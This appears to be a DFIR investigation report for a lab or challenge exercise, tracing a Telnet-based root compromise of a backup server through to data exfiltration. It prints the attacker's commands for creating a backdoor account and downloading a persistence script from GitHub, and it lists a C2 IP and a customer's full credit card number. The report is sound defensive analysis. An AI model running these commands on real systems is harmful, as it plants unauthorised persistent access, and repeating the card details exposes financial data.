# 🛰️ Telly – DFIR Investigation Report

## 📌 Case Overview

A DLP alert flagged suspicious outbound activity from a backup server. Network telemetry was analyzed to determine how the attacker gained access, what actions were performed, and what data was exfiltrated.

**Role:** Junior DFIR Analyst
**Server Role:** Backup server
**Hostname:** backup-secondary
**Data Source:** Network capture (PCAP)

---

## 🧭 Investigation Summary

* Initial access through vulnerable Telnet service
* Root shell obtained
* Backdoor account created
* Persistence script downloaded from GitHub
* C2 channel established
* Sensitive database exfiltrated

---

## 1️⃣ Initial Access – Telnet Exploit

The attacker connected to the backup server using Telnet and successfully gained root access.

* Exploited CVE: **CVE-2026-24061**
* Exploit success time: **2026-01-27 10:39:28**
* Source IP: **192.168.72.131**
* Target IP: **192.168.72.136**

### Evidence

Telnet session establishment visible in packet capture.

📷 **Screenshot Placeholder**
(Insert Telnet handshake screenshot)

---

## 2️⃣ Host Identification

DHCP traffic reveals hostname of compromised machine.

* Hostname: **backup-secondary**

### Evidence

DHCP packet shows hostname field.

📷 **Screenshot Placeholder**
(Insert DHCP hostname screenshot)

---

## 3️⃣ Post-Exploitation Activity

Attacker navigated system directories and executed commands over Telnet.

Commands observed in TCP stream:

```
sudo useradd -m -s /bin/bash cleanupsvc
 echo "cleanupsvc:YouKnowWhoiam69" | sudo chpasswd
```

### Backdoor Account

* Username: **cleanupsvc**
* Password: **YouKnowWhoiam69**

📷 **Screenshot Placeholder**
(Insert user creation command screenshot)

---

## 4️⃣ Persistence Installation

Attacker downloaded a persistence script from GitHub.

Command used:

```
wget https://raw.githubusercontent.com/montysecurity/linper/refs/heads/main/linper.sh
```

Download confirmed via HTTP stream.

📷 **Screenshot Placeholder**
(Insert wget download screenshot)

---

## 5️⃣ Command & Control

Persistence script connected to external C2 server.

* C2 IP: **91.99.25.54**

Indicates long-term remote access channel.

---

## 6️⃣ Data Exfiltration

Sensitive database file transferred out.

* File: **credit-cards-25-blackfriday.db**
* Exfiltration time: **2026-01-27 10:49:54**

### Evidence

File observed in exported HTTP objects list.

📷 **Screenshot Placeholder**
(Insert HTTP object export screenshot)

---

## 7️⃣ Data Validation (Compliance)

Breached database contained customer payment data.

Customer found:

* Name: **Quinn Harris**
* Credit Card: **5312269047781209**

This confirms sensitive financial data exposure.

---

## ⏱️ Attack Timeline

| Time        | Event                            |
| ----------- | -------------------------------- |
| 10:39:28    | Telnet exploit successful        |
| 10:41–10:44 | Commands executed + user created |
| 10:44:31    | Persistence script downloaded    |
| 10:49:54    | Database exfiltrated             |

---

## 🚨 Impact

* Root access compromise
* Persistent attacker access
* Customer financial data stolen
* Compliance breach notification required

---

## 🛡️ Recommendations

* Disable Telnet permanently
* Patch CVE-2026-24061
* Remove backdoor account
* Block C2 IP 91.99.25.54
* Reset all credentials
* Monitor outbound traffic
* Deploy EDR on backup servers
* Restrict internet access from backup systems

---

## 🧾 Conclusion

The attacker exploited an exposed Telnet service, gained root access, created a persistent backdoor account, installed a remote access script, and exfiltrated a sensitive customer database within minutes. The system lacked service hardening and outbound monitoring, allowing rapid compromise and data theft.
